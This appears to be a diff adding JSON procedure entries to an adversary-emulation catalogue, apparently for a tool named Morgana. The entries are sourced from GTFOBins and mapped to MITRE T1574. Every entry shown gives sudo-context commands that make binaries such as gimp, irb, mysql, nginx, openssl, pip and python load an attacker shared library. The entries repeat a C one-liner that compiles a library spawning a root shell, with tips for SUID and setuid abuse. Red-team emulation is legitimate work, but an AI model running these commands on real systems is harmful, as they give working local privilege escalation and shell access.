+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: gimp. Context: Sudo. This allows to run Python code (`...`). It hangs afterwards and can be terminated by pressing `Ctrl-C`. Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "gimp -idf --batch-interpreter=python-fu-eval -b '...'\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/gimp",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/gimp",
+        "source_bin": "gimp",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "gimp",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "gimp",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:gimp:library-load:0:sudo:0:gimp>python",
+        "source_name": "gimp",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `gimp` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:irb:library-load:0:sudo:0:irb>ruby",
+      "name": "GTFOBINS - T1574 - irb - Library load - Sudo [9dceb6a]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: irb. Context: Sudo. This allows to run Ruby code (`...`). Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "irb\n...\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/irb",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/irb",
+        "source_bin": "irb",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "ruby",
+        "inheritance_path": [
+          "irb",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "ruby",
+          "inheritance_path": [
+            "irb",
+            "ruby"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:irb:library-load:0:sudo:0:irb>ruby",
+        "source_name": "irb",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `irb` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:knife:library-load:0:sudo:0:knife>ruby",
+      "name": "GTFOBINS - T1574 - knife - Library load - Sudo [936c356]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: knife. Context: Sudo. This allows to run Ruby code (`...`). Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "knife exec -E '...'\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/knife",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/knife",
+        "source_bin": "knife",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "ruby",
+        "inheritance_path": [
+          "knife",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "ruby",
+          "inheritance_path": [
+            "knife",
+            "ruby"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:knife:library-load:0:sudo:0:knife>ruby",
+        "source_name": "knife",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `knife` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:ldconfig:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - ldconfig - Library load - Sudo [9367882]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: ldconfig. Context: Sudo. This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system. First identify the shared libraries used by the target program, for example: ``` $ ldd /bin/ping | grep libcap libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000) ``` Then create the shared library override, named `libcap.so.2`, and put in in `/path/to/...",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo /path/to/temp-dir/ >#{lotl_gtfobins_local_path}\nldconfig -f #{lotl_gtfobins_local_path}\nping",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ldconfig",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ldconfig",
+        "source_bin": "ldconfig",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ldconfig:library-load:0:sudo::",
+        "source_name": "ldconfig",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `ldconfig` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:msfconsole:library-load:0:sudo:0:msfconsole>irb>ruby",
+      "name": "GTFOBINS - T1574 - msfconsole - Library load - Sudo [5accefe]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: msfconsole. Context: Sudo. Inherits library-load behavior from irb. This allows to run Ruby code (`...`). Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "msfconsole\nirb\nirb\n...\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/msfconsole",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/msfconsole",
+        "source_bin": "msfconsole",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "irb",
+        "inheritance_path": [
+          "msfconsole",
+          "irb",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "irb",
+          "inheritance_path": [
+            "msfconsole",
+            "irb",
+            "ruby"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:msfconsole:library-load:0:sudo:0:msfconsole>irb>ruby",
+        "source_name": "msfconsole",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `msfconsole` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:mysql:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - mysql - Library load - Sudo [4aecef9]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: mysql. Context: Sudo. The following loads the `/path/to/lib.so` shared object.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "mysql --default-auth ../../../../../path/to/lib",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/mysql",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/mysql",
+        "source_bin": "mysql",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "version": "5.5"
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:mysql:library-load:0:sudo::",
+        "source_name": "mysql",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `mysql` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nginx:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - nginx - Library load - Sudo [531565b]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: nginx. Context: Sudo. Alternatively, the `ssl_engine` directive can be used.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "cat >#{lotl_gtfobins_local_path} <<EOF\nload_module #{lotl_gtfobins_payload_path};\nEOF\n\nnginx -t -c #{lotl_gtfobins_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nginx",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nginx",
+        "source_bin": "nginx",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nginx:library-load:0:sudo::",
+        "source_name": "nginx",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `nginx` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:openssl:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - openssl - Library load - Sudo [b2be474]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: openssl. Context: Sudo.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "openssl req -engine ./lib.so",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/openssl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/openssl",
+        "source_bin": "openssl",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:openssl:library-load:0:sudo::",
+        "source_name": "openssl",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `openssl` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:pdb:library-load:0:sudo:0:pdb>python",
+      "name": "GTFOBINS - T1574 - pdb - Library load - Sudo [e3d3df0]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: pdb. Context: Sudo. This allows to run Python code (`...`). Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >#{lotl_gtfobins_local_path}\npdb #{lotl_gtfobins_local_path}\ncont\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/pdb",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/pdb",
+        "source_bin": "pdb",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "pdb",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "pdb",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:pdb:library-load:0:sudo:0:pdb>python",
+        "source_name": "pdb",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `pdb` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:pipx:library-load:0:sudo:0:pipx>python",
+      "name": "GTFOBINS - T1574 - pipx - Library load - Sudo [01d3712]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: pipx. Context: Sudo. This allows to run Python code (`...`). Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >/path/to/file.py\npipx run /path/to/file.py\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/pipx",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/pipx",
+        "source_bin": "pipx",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "pipx",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "pipx",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:pipx:library-load:0:sudo:0:pipx>python",
+        "source_name": "pipx",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `pipx` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:pip:library-load:0:sudo:0:pip>python",
+      "name": "GTFOBINS - T1574 - pip - Library load - Sudo [c0e534a]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: pip. Context: Sudo. This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`). Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example: ``` echo 'import os; os.system(\"exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty\")' >setup.py ``` The `--break-system-packages` flag can be omitted in older systems. Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >setup.py\npip install --break-system-packages .\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/pip",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/pip",
+        "source_bin": "pip",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "pip",
+          "python"
+        ],
+        "interactive": true,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "pip",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:pip:library-load:0:sudo:0:pip>python",
+        "source_name": "pip",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "interactive",
+        "prerequisites": [
+          "The `pip` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:poetry:library-load:0:sudo:0:poetry>python",
+      "name": "GTFOBINS - T1574 - poetry - Library load - Sudo [f341c61]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: poetry. Context: Sudo. This allows to run Python code (`...`). A valid `pyproject.toml` file must be present in the current working directory, you can create one with `poetry init -n`. Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >#{lotl_gtfobins_local_path}\npoetry run python #{lotl_gtfobins_local_path}\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/poetry",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/poetry",
+        "source_bin": "poetry",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "poetry",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "poetry",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:poetry:library-load:0:sudo:0:poetry>python",
+        "source_name": "poetry",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `poetry` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:pry:library-load:0:sudo:0:pry>irb>ruby",
+      "name": "GTFOBINS - T1574 - pry - Library load - Sudo [c370a6d]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: pry. Context: Sudo. Inherits library-load behavior from irb. This allows to run Ruby code (`...`). Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "pry\nirb\n...\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/pry",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/pry",
+        "source_bin": "pry",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "irb",
+        "inheritance_path": [
+          "pry",
+          "irb",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "irb",
+          "inheritance_path": [
+            "pry",
+            "irb",
+            "ruby"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:pry:library-load:0:sudo:0:pry>irb>ruby",
+        "source_name": "pry",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `pry` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:python:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - python - Library load - Sudo [9cf9146]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: python. Context: Sudo.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/python",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/python",
+        "source_bin": "python",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
